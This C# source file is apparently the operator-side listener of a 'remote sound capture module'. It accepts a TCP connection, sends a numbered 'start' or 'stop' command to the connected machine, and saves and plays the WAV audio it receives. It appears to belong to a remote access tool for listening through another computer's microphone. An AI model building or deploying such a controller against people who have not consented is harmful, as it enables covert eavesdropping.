using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RemoteSoundCapture
{
    class RemoteSoundCapture
    {

        Socket tcpSocket;
        long soundLastId = 0;
        Thread mediaChannelProcessor;

        public TcpListener prepareReceiver(string ip, int port)
        {
            System.Console.WriteLine("Bound to: " + ip + ":" + port);
            IPAddress ipaddress = IPAddress.Parse(ip);
            TcpListener listener = new TcpListener(ipaddress, port);
            try
            {
                listener.Start();
            }
            catch (Exception e) {

                System.Console.WriteLine(e.Message);
                return null;
            
            }
                return listener;
        }

        public void receiveConnection(TcpListener listener)
        {

            while (true)
            {

                if (listener.Pending())
                {
                    tcpSocket = listener.AcceptSocket();
                    return;
                }
            }
        }



        public void processMediaChannel()
        {

            byte[] media = new byte[600000];
            FileStream soundStream = null;
            FileStream tempStream = null;
            int soundSize;

            while (true)
            {
                try{
                    soundSize = tcpSocket.Receive(media);
                }catch(Exception e){

                    System.Console.WriteLine("Lost connection. Please retry...");

                    return;
                }
                //System.Console.WriteLine("Bytes Read: " + media);
                try
                {

                    tempStream = new FileStream(".\\sound.wav",FileMode.Create);
                    tempStream.Write(media,0,soundSize);
                    tempStream.Dispose();
                    soundStream = new FileStream(".\\Sound\\sound" + Convert.ToString(soundLastId) + ".wav", FileMode.Create);
                    soundStream.Write(media, 0, soundSize);
                    soundStream.Dispose();
                    soundLastId++;
                    (new SoundPlayer(".\\sound.wav")).Play();
                }
                catch (Exception e) { System.Console.WriteLine(e.Message); }
               

            }
        }




        static void Main(string[] args)
        {


            RemoteSoundCapture rSoundCapture = new RemoteSoundCapture();
            TcpListener listener = rSoundCapture.prepareReceiver(args[0], Convert.ToInt16(args[1]));
            if (listener == null) {
                System.Console.ReadKey();
                Environment.Exit(1);
            }
       
            rSoundCapture.receiveConnection(listener);
            
            while (true)
            {
                System.Console.WriteLine("Welcome to the remote sound capture module.");
                System.Console.WriteLine("start");
                System.Console.WriteLine("stop");
                String command = System.Console.ReadLine();

                if (command.Equals("start"))
                {
                    rSoundCapture.mediaChannelProcessor = new Thread(rSoundCapture.processMediaChannel);
                    try
                    {
                        rSoundCapture.mediaChannelProcessor.Start();
                    }
                    catch (Exception e) {
                        System.Console.WriteLine(e.Message);
                        continue;
                    }
                }

                try
                {
                    rSoundCapture.tcpSocket.Send(Encoding.ASCII.GetBytes("4 " + command));
                }
                catch (Exception e) {

                    System.Console.WriteLine("Lost connection. Please wait...");
                    rSoundCapture.receiveConnection(listener);
                    continue;
                }

                if (command.Equals("stop")) {
                    rSoundCapture.mediaChannelProcessor.Abort();
                    rSoundCapture.tcpSocket.Close();
                    Environment.Exit(0);
                    
                }
                
            }


        }
    }
}
